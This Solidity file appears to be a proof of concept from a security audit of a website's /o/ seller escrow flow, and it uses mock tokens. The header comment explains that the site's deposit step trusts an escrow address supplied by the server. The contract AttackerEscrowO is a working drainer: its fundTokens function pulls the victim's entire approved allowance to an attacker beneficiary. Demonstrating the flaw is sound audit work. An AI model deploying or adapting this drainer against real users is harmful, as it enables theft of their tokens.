// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ROUND 15 — K-921: the attacker's fake escrow for the /o/ seller flow.
//
// The Bull website /o/ (chunk page-eb80c274980afe6e.js) deposit function
// Z() sends approve(token -> j.escrow.address, sellAmount) + fundTokens(
// j.escrow.dealId) to the escrow address taken from the server's
// GET /api/seller/<token> response — never comparing it against the
// hardcoded HI (0xd961cA37e339E14e0D3478383a252E218fe7aa4a, used 0x in
// Z() while the ghost flow z() in the SAME file pins HI + verifies the
// deal on-chain). This contract is what a malicious server points the
// seller at: fundTokens(uint256) drains whatever the seller approved.
// No signature is ever verified; no deal needs to exist.
import "./Mocks.sol";

contract AttackerEscrowO {
    address public immutable token;
    address public immutable beneficiary;

    constructor(address token_, address beneficiary_) {
        token = token_;
        beneficiary = beneficiary_;
    }

    // Drains the victim's approval (set by the website's Z() step).
    function fundTokens(uint256) external {
        uint256 a = MockERC20(token).allowance(msg.sender, address(this));
        if (a > 0) {
            require(MockERC20(token).transferFrom(msg.sender, beneficiary, a), "drain failed");
        }
    }
}
